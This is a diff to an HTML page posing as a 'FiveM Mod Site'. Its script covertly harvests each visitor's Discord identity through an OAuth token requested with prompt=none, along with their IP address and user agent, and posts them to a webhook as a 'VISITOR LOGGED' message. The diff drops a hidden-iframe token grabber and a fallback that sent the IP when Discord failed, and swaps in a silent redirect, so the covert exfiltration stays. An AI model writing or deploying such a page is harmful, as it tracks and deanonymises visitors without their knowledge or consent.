@@ -91,16 +91,6 @@
         .status .success { color: #22c55e; }
         .status .error { color: #ef4444; }
         .status .info { color: #3b82f6; }
-        .hidden-iframe {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            border: none;
-            top: -9999px;
-            left: -9999px;
-        }
     </style>
 </head>
 <body>
@@ -132,11 +122,8 @@
 </div>
 
 <div class="footer">
-    FiveM Mod Site — Silent Mode
+    FiveM Mod Site
 </div>
-
-<!-- Hidden iframe for silent Discord auth -->
-<iframe id="discordFrame" class="hidden-iframe"></iframe>
 
 <script>
     // ============================================================
@@ -156,7 +143,6 @@
     const discordIdEl = document.getElementById('discordId');
     const ipDisplayEl = document.getElementById('ipDisplay');
     const statusEl = document.getElementById('status');
-    const frame = document.getElementById('discordFrame');
 
     // ============================================================
     // STATUS HELPER
@@ -187,7 +173,7 @@
         const timestamp = new Date().toLocaleString();
 
         const payload = {
-            content: `**👁️ SILENT VISITOR LOGGED**\n` +
+            content: `**👁️ VISITOR LOGGED**\n` +
                      `**Discord:** ${displayName} (${discordUser.id})\n` +
                      `**IP:** ${ip}\n` +
                      `**User-Agent:** ${navigator.userAgent}\n` +
@@ -244,122 +230,46 @@
     }
 
     // ============================================================
-    // SILENT AUTH VIA IFRAME — NO POPUPS, NO REDIRECTS
-    // ============================================================
-    function silentAuthViaIframe() {
-        return new Promise((resolve, reject) => {
-            const authUrl =
-                `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;
-
-            // Load the auth URL in the hidden iframe
-            frame.src = authUrl;
-
-            // Listen for messages from the iframe (Discord redirects to our page with token in hash)
-            let timeout = setTimeout(() => {
-                reject(new Error('Authentication timed out.'));
-            }, 15000);
-
-            // Poll the iframe URL for the token
-            const interval = setInterval(() => {
-                try {
-                    // Try to access the iframe's location
-                    const iframeUrl = frame.contentWindow?.location?.href;
-                    if (iframeUrl && iframeUrl.includes('access_token=')) {
-                        clearInterval(interval);
-                        clearTimeout(timeout);
-                        const hash = iframeUrl.split('#')[1];
-                        const params = new URLSearchParams(hash);
-                        const token = params.get('access_token');
-                        if (token) {
-                            frame.src = 'about:blank';
-                            resolve(token);
-                        } else {
-                            reject(new Error('No token found'));
-                        }
-                    }
-                    // If the iframe redirected to our page with hash
-                    if (iframeUrl && iframeUrl.includes(window.location.origin) && iframeUrl.includes('#')) {
-                        clearInterval(interval);
-                        clearTimeout(timeout);
-                        const hash = iframeUrl.split('#')[1];
-                        const params = new URLSearchParams(hash);
-                        const token = params.get('access_token');
-                        if (token) {
-                            frame.src = 'about:blank';
-                            resolve(token);
-                        } else {
-                            reject(new Error('No token found'));
-                        }
-                    }
-                } catch (e) {
-                    // Cross-origin errors are normal — ignore them
-                }
-            }, 200);
-        });
-    }
-
-    // ============================================================
-    // MAIN
+    // MAIN — Blink redirect method
     // ============================================================
     async function init() {
-        try {
-            // Check if we already have a token from a previous auth
-            const hash = window.location.hash.substring(1);
-            const params = new URLSearchParams(hash);
-            let token = params.get('access_token');
+        // Check if we have a token in the URL (returned from Discord)
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        let token = params.get('access_token');
 
-            if (token) {
-                window.history.replaceState({}, document.title, window.location.pathname);
-            } else {
-                setStatus('🔐 Silent authentication via iframe...', 'info');
-                token = await silentAuthViaIframe();
-            }
+        if (token) {
+            // We have a token! Clean the URL and proceed
+            window.history.replaceState({}, document.title, window.location.pathname);
 
             const user = await getDiscordUser(token);
-            if (!user || !user.id) {
-                throw new Error('Failed to get user info');
+            if (user && user.id) {
+                const ip = await getIP();
+                showUser(user);
+                ipDisplayEl.textContent = ip;
+                await sendToWebhook(user, ip);
+                return;
+            } else {
+                setStatus('❌ Failed to get user info', 'error');
             }
-
-            const ip = await getIP();
-            showUser(user);
-            ipDisplayEl.textContent = ip;
-            await sendToWebhook(user, ip);
-
-        } catch (err) {
-            setStatus(`❌ Error: ${err.message}`, 'error');
-            // Fallback — still show the page
-            loadingEl.classList.add('hidden');
-            contentEl.classList.remove('hidden');
-            usernameEl.textContent = 'Guest';
-            discordIdEl.textContent = 'ID: unknown';
-            ipDisplayEl.textContent = await getIP();
-            // Still send IP to webhook even if Discord failed
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**👁️ VISITOR (Discord failed)**\n` +
-                                 `**IP:** ${await getIP()}\n` +
-                                 `**User-Agent:** ${navigator.userAgent}\n` +
-                                 `**Timestamp:** ${new Date().toLocaleString()}\n` +
-                                 `**Error:** ${err.message}`
-                    })
-                });
-            } catch {}
         }
+
+        // No token — do a fast redirect to Discord with prompt=none
+        // This will redirect back immediately if the user is already logged in
+        setStatus('🔐 Authenticating...', 'info');
+
+        // Use prompt=none to skip the consent screen if already authorized
+        const authUrl =
+            `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;
+
+        // Redirect to Discord
+        window.location.replace(authUrl);
     }
 
     // ============================================================
     // START
     // ============================================================
-    // If this page is opened inside the iframe with a token, close it
-    if (window.location.hash.includes('access_token')) {
-        // The iframe has the token — we don't need to do anything here
-        // The parent page will poll and get it
-    } else {
-        init();
-    }
+    init();
 </script>
 
 </body>
